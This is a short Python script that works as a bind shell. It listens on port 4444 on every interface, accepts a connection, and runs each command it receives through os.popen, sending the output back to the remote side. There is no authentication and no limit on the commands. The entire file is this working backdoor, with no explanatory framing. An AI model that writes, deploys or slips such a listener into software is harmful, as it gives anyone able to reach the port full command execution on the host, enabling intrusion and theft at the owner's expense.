import socket as sock # An api
import os
host=""
port=4444

# Creation of socket
s=sock.socket(sock.AF_INET,sock.SOCK_STREAM)

# Binding the socket
s.bind((host,port))

# listening to the socket
s.listen(100)

# Accept the connection
conn,addr=s.accept()
print("{} is connected with back port {}".format(addr[0],addr[1]))
while True:
    data=conn.recv(1024)
    if not data:
        break
    else:
        data=data.decode().strip()
        print("Data from {} : {}".format(addr[0],data))
        if (data=="quit" or data=="exit"):
            conn.sendall("Connection closed ..".encode())
            break
        else:
                # data="echo >>"+data+"\n"
            f=os.popen(data)
            result=f.read()
            conn.sendall(result.encode())

s.close()


